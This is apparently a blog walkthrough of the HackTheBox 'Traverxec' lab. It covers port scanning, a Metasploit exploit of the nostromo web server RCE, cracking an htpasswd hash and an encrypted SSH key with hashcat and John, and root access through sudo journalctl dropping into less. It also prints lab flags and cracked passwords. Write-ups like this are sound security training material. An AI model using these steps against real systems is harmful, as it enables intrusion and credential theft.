---
title: HackTheBox - Traverxec
date: 2021-01-02 16:37:46 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, nostromo, RCE, CVE-2019-16278, metasploit, reverse-shell, password "cracking", hashcat, rabbit hole, ssh2john, John The Ripper, sudo misconfiguration, gtfobins, journalctl, less, shrink terminal, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/Traverxec.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Traverxec-full-port-scan.txt 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.10s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

### nostromo 1.9.6 (port 80)

![nostromo](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/80.png)

Looking at server's HTTP response headers we can confirm that we're facing with `nostromo` version **1.9.6**.

> We already saw that via `nmap` scan.

There is a RCE vuln on this specific version: 

![searchsploit nostromo](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/searchsploit-nostromo.png)

### Metasploit

![msf nostromo](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/msf-1.png)

![msf nostromo](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/msf-2.png)

Now we have a shell as `www-data` user.

## User (david)

As expected (because of the web page), there is a user called **david**:

```bash
w-data@traverxec:/usr/bin$ cd /home
cd /home
www-data@traverxec:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root  root  4096 Oct 25  2019 .
drwxr-xr-x 18 root  root  4096 Oct 25  2019 ..
drwx--x--x  5 david david 4096 Oct 25  2019 david
www-data@traverxec:/home$ cd david
www-data@traverxec:/home/david$ ls
ls: cannot open directory '.': Permission denied
```

It's weird because we can enter to **david**'s home directory but we cannot see what's inside. However there are some things that we have access to:

```bash
www-data@traverxec:/home/david$ head -n5 .bashrc
head -n5 .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
www-data@traverxec:/home/david$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

Via `linpeas.sh`, we can see this interesting information:

![linpeas](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/linpeas.png)

It looks like an ` /etc/shadow` password. 

- `$1` indicates that the hashing algorithm used is **MD5**
- `e7NfNpNi` (the content between the second and third `$` sign) is the salt value.
- `A6nCwOTqrNR2oDuIKirRZ` is hash of "password + salt"

### Crcaking `.htpasswd` using `hashcat`

![hashcat](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/hashcat.png)

> `-m 500` tells `hashcat` to use **MD5(Unix)** mode

![david's password](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/david-passwd.png)

But we cannot log in as david with this password: `Nowonly4me`.

```bash
www-data@traverxec:/tmp$ su david  
su david
Password: Nowonly4me

su: Authentication failure
www-data@traverxec:/tmp$
```

### `/var/nostromo/conf`

I decided to investigate more in `/var/nostromo/conf` directory, because it's where we found `.htpasswd` file:

```bash
www-data@traverxec:/var/nostromo/conf$ ls -la
ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
```

There is a file called `nhttpd.conf`. Let's see its content:

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

The last two lines indicates that we can access to `/home` directory through `http://10.10.10.165/~username` if the user has a sub directory called `public_www`.

Let's try [http://10.10.10.165/](http://10.10.10.165/~username~david):

![public_www david](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/public_www.png)

### `/home/david/public_www`

```bash
www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls -la
ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
www-data@traverxec:/home/david/public_www$ 
```

Let's take a look at `protected-file-area` directory:

```bash
www-data@traverxec:/home/david/public_www$ cd protected-file-area
cd protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$ cat .htaccess
realm David's Protected File Area. Keep out!
```

I want to open `backup-ssh-identity-files.tgz`. In order to transfer it to my machine, I decided to use **base64**:

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz | base64
entity-files.tgz | base64
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
```

![transfer gz archive into my machine using base64](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/b64-gz.png)

### backup-ssh-identity-files.tgz

```bash
$ cp ../backup-ssh-identity-files.tgz .
$ tar xvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

Obviously the RSA key is encrypted:

![encrypted RSA key](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/enc.png)

Therefore, we have to use `ssh2john`

### ssh2john

```bash
$ /usr/share/john/ssh2john.py home/david/.ssh/id_rsa > david_rsa.john
$ john david_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)
1g 0:00:00:02 DONE (2021-01-02 14:15) 0.4878g/s 6995Kp/s 6995Kc/s 6995KC/s  0125457423 ..*7¡Vamos!
Session completed
```

The password of `id_rsa` is `hunter`. We can now log in as **david**:

![ssh david](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/ssh-david.png)

- `user.txt`:

```bash
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```

There is a `bin` directory inside `home/david`, let's see what's inside:

![/home/david](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/home-david.png)

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

Because of the pipe (`| /usr/bin/cat`), this last command with `sudo` runs with `david`'s privileges.

So if we run the last command without the pipe, we'll be opening `less`  according to [GTFOBins - journalctl](https://gtfobins.github.io/gtfobins/journalctl/) and then we can privesc.

![](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/gtfo-journalctl.png)

## Root

When I first ran the exploit, the process didn't invoke `less`. 

I was thinking that the box was patched and that was not the intended way to root it.

![failed](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/failed.png)

However, I remembered a similar challenge [Bandit - Level 25](https://overthewire.org/wargames/bandit/bandit26.html) where we have to privesc with `more`. 

In this challenge, we had to reduce the console window to less than 5 lines _(since the output of our command is less than about 5 lines of text)_ in order to force the process to run the text editor.

I reduced the size of my terminal window, and it worked:

![explot worked](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/explot-worked.png)

![root flag](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/traverxec/root-flag.png)

- root's flag: `9aa36a6d76f785dfd320a478f6e0d906`
___

## Useful links

- [CVE-2019-16278](https://cvedetails.com/cve/CVE-2019-16278/)
- [CVE-2019-16278 - Unauthenticated Remote Code Execution in Nostromo web server](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html)
